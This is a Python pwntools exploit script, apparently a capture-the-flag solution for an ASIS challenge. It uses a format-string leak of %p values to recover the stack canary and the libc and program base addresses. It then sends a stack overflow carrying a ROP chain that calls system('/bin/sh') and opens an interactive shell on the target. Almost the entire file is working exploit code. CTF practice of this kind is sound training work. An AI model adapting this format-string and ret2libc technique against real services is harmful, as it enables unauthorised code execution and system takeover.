from pwn import *

binary = ELF('chall')
libc = ELF('libc-2.27.so')
context.update(arch='amd64', os='linux')
context.binary = binary

HOST = "localhost"
PORT = 9000
p = remote(HOST, PORT)
print()
# leak the canary value
log.info("leaking canary...")
p.sendline((0x40 // 2 - 1) * '%p')
_ = p.recvline().strip().replace(b'(nil)', b'0x0').replace(b'0x', b' 0x').split()
canary = int(_[13], 16)
log.info("canary leaked")
log.success('canary --> %s\n\n' % hex(canary))

# leak the base address of libc
log.info("leaking libc_base...")
baselibc = int(_[15], 16) - libc.symbols['__libc_start_main'] - 231
libc.address = baselibc
log.info("libc_base leaked")
log.success('libc_base --> %s\n\n' % hex(baselibc))

# leak the base address of proc
log.info("leaking proc...")
baseproc = int(_[19], 16) - binary.symbols['main']
binary.address = baseproc
log.info("proc leaked")
log.success('proc_base --> %s\n\n' % hex(baseproc))

# Building the ROPchain
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
payload = b'\x00'*(0x58 - 0x10)
payload += p64(canary)
payload += b'A' * 8
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

# send the payload to the server
p.sendline(payload)
p.interactive()

# FLAG --> ASIS{s3cur1ty_pr0t3ct10n_1s_n07_s1lv3r_bull3t}
